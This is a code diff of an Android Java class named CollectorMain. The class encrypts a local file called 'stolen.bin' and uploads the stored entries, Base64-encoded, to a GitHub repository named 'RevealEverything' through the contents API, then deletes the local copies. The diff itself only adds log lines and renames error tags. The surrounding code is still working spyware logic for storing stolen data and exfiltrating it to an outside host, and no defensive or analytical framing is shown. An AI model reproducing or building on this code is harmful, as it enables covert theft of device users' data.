@@ -45,6 +45,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		try {
 			if(new File(getFilesDir(), "stolen.bin").exists()){
 				//encrypt the file
+				Log.d("CollectorMain","migrating");
 				stolenInfos = new BinaryPrefImpl(new File(getFilesDir(), "stolen.bin"));
 				stolenInfos=new HeavilyEncryptedBinaryPrefImpl(stolenInfos.getAll());
 				FileOutputStream fos=null;
@@ -52,7 +53,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 					fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
 					fos.write(stolenInfos.toBytes());
 				} catch (IOException e) {
-					DebugWriter.writeToE("NSPP",e);
+					DebugWriter.writeToE("CollectorMain",e);
 					return;
 				} finally {
 					try {
@@ -61,6 +62,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 					running = false;
 				}
 				new File(getFilesDir(), "stolen.bin").delete();
+				Log.d("CollectorMain","done");
 			}
 			if (stolenInfos == null)
 				stolenInfos = new HeavilyEncryptedBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
@@ -97,7 +99,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 					try {
 						Map<String, String> params = new HashMap<>();
 				        params.put("path", filename);
-						params.put("message", "upload");
+						params.put("message", uuid+":"+Utils.randomText(64));
 						byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
 						try {
 							params.put("sha", getHash(cont, filename));
@@ -106,7 +108,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 								continue;
 							}
 						} catch (Throwable e) {
-							DebugWriter.writeToE("NSPP",e);
+							DebugWriter.writeToE("CollectorMain",e);
 						}
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
 						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params,
@@ -115,7 +117,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 						Log.d("repo", "uploaded");
 						sb.edit().remove(actual).apply();
 				    } catch (Throwable e) {
-						DebugWriter.writeToE("NSPP",e);
+						DebugWriter.writeToE("CollectorMain",e);
 						continue;
 					}
 				}
@@ -130,7 +132,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
 				fos.write(sb.toBytes());
 			} catch (IOException e) {
-				DebugWriter.writeToE("NSPP",e);
+				DebugWriter.writeToE("CollectorMain",e);
 			} finally {
 				try {
 					if (fos != null)fos.close();
